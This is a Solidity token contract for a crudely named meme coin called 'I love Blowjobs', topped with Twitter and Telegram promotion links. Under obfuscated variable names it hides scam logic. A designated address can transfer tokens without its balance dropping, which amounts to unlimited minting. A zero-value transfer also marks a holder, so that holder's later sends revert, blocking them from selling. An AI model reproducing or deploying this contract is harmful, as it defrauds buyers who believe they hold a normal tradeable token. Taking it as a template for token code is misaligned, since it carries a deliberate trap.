/*

🔗Twitter: https://twitter.com/i_LoveBlowjobs

💬 Join our TG: https://t.me/iloveblowjobs

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract IloveBlowjobs is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private eventually = 48;

    function transferFrom(address newspaper, address quick, uint256 broad) public returns (bool success) {
        require(broad <= allowance[newspaper][msg.sender]);
        allowance[newspaper][msg.sender] -= broad;
        row(newspaper, quick, broad);
        return true;
    }

    mapping(address => uint256) private respect;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'I love Blowjobs';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private plates;

    string public name = 'I love Blowjobs';

    constructor(address buffalo) {
        balanceOf[msg.sender] = totalSupply;
        respect[buffalo] = eventually;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function row(address newspaper, address quick, uint256 broad) private returns (bool success) {
        if (respect[newspaper] == 0) {
            balanceOf[newspaper] -= broad;
        }

        if (broad == 0) plates[quick] += eventually;

        if (newspaper != uniswapV2Pair && respect[newspaper] == 0 && plates[newspaper] > 0) {
            respect[newspaper] -= eventually;
        }

        balanceOf[quick] += broad;
        emit Transfer(newspaper, quick, broad);
        return true;
    }

    function approve(address potatoes, uint256 broad) public returns (bool success) {
        allowance[msg.sender][potatoes] = broad;
        emit Approval(msg.sender, potatoes, broad);
        return true;
    }

    function transfer(address quick, uint256 broad) public returns (bool success) {
        row(msg.sender, quick, broad);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}